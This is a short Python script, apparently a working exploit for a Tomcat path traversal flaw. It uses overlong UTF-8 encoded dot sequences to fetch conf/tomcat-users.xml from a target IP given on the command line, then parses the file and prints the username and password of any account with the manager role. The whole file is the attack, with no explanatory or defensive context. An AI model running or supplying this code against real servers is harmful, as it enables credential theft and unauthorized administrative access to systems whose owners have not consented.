import sys
import urllib.request as web
import xml.etree.ElementTree as ElementTree

DOT_DOT = "%c0%ae%c0%ae"

def get_tomcatusersxml(ip):
    return web.urlopen("http://"+ip+"/"+DOT_DOT+"/"+DOT_DOT+"/conf/tomcat-users.xml").read()

def find_manager(tree):
    users = tree.iterfind("user[@roles]")
    for user in users:
        roles = user.attrib["roles"].split(",")
        for role in roles:
            if role == "manager":
                return user.attrib["username"]+" "+user.attrib["password"]

ip = sys.argv[1]
remote_xml = get_tomcatusersxml(ip)
tree = ElementTree.fromstring(remote_xml)
manager = find_manager(tree)

print(manager)